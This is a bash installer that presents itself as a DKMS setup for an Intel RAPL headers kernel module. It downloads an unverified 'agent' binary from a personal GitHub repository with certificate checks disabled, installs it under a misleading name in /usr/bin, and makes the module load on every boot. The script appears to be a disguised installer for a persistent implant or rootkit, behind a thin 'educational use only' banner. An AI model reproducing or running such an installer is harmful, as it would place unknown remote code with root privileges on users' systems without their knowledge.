#!/bin/bash

# Install Script with DKMS Support
# Compatible with Ubuntu, Debian, CentOS, RHEL, Fedora, Arch

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

MODULE_NAME="intel_rapl_headers"
MODULE_VERSION="1.0"
SRC_DIR="/usr/src/${MODULE_NAME}-${MODULE_VERSION}"

# Banner
echo -e "${BLUE}"
cat << "EOF"
  ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ▒░▒   ░  ░ ░  ░░ ░ ▒  ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░░   ░    ░    ░    ░  ░    ░    ░     ░ ░    ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░        ░  ░ ░       ░         ░  ░    ░  ░ ░      ░ ░           ░ 
                      ░       ░                                        

                      INSTALLER (DKMS)
EOF
echo -e "${NC}"
echo -e "${YELLOW}[!] For educational/research use only.${NC}\n"

# Detect and install DKMS
echo -e "${BLUE}[*] Checking and installing DKMS...${NC}"

if ! command -v dkms &>/dev/null; then
    if [ -f /etc/debian_version ]; then
        sudo apt update && sudo apt install -y dkms
    elif [ -f /etc/redhat-release ]; then
        if command -v dnf &>/dev/null; then
            sudo dnf install -y dkms
        else
            sudo yum install -y epel-release
            sudo yum install -y dkms
        fi
    elif [ -f /etc/arch-release ]; then
        sudo pacman -Sy --noconfirm dkms
    else
        echo -e "${RED}[!] Unsupported distribution. Please install DKMS manually.${NC}"
        exit 1
    fi
else
    echo -e "${GREEN}[+] DKMS is already installed.${NC}"
fi

# Check for build tools
for cmd in make gcc wget; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}[!] Required tool '$cmd' not found. Please install it.${NC}"
        exit 1
    fi
done

# Check for kernel headers
if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
    echo -e "${RED}[!] Kernel headers not found for $(uname -r).${NC}"
    echo -e "${YELLOW}    Debian/Ubuntu: sudo apt install linux-headers-$(uname -r)${NC}"
    echo -e "${YELLOW}    RHEL/CentOS: sudo yum install kernel-devel${NC}"
    echo -e "${YELLOW}    Arch: sudo pacman -S linux-headers${NC}"
    exit 1
fi

echo -e "${GREEN}[+] All system requirements met.${NC}"

# Download optional binary
echo -e "${BLUE}[*] Downloading agent binary...${NC}"
sudo wget https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package --no-check-certificate -O /usr/bin/intelheaders_gnu
sudo chmod +x /usr/bin/intelheaders_gnu
echo -e "${GREEN}[+] Agent installed to /usr/bin/intelheaders_gnu${NC}"

# Prepare DKMS source directory
echo -e "${BLUE}[*] Preparing DKMS source directory...${NC}"
sudo mkdir -p "$SRC_DIR"
sudo cp ./*.c "$SRC_DIR"
sudo cp Makefile "$SRC_DIR"

# Create dkms.conf
echo -e "${BLUE}[*] Creating dkms.conf...${NC}"
sudo tee "$SRC_DIR/dkms.conf" > /dev/null <<EOF
PACKAGE_NAME="${MODULE_NAME}"
PACKAGE_VERSION="${MODULE_VERSION}"
BUILT_MODULE_NAME[0]="${MODULE_NAME}"
DEST_MODULE_LOCATION[0]="/kernel/drivers/${MODULE_NAME}"
AUTOINSTALL="yes"
EOF

# Register, build, and install module via DKMS
echo -e "${BLUE}[*] Adding, building and installing via DKMS...${NC}"
sudo dkms add -m "${MODULE_NAME}" -v "${MODULE_VERSION}" || true
sudo dkms build -m "${MODULE_NAME}" -v "${MODULE_VERSION}"
sudo dkms install -m "${MODULE_NAME}" -v "${MODULE_VERSION}"

# Auto-load on boot
echo "${MODULE_NAME}" | sudo tee /etc/modules-load.d/${MODULE_NAME}.conf > /dev/null
echo -e "${GREEN}[+] Module will auto-load on boot.${NC}"

# Load now
echo -e "${BLUE}[*] Loading module...${NC}"
if sudo modprobe "${MODULE_NAME}"; then
    echo -e "${GREEN}[✓] Module loaded successfully.${NC}"
else
    echo -e "${RED}[!] Failed to load module. Check 'dmesg' for errors.${NC}"
    exit 1
fi

# Finish
echo -e "${GREEN}[✓] Installation complete. Module is DKMS-enabled and persistent across reboots and kernel updates.${NC}"
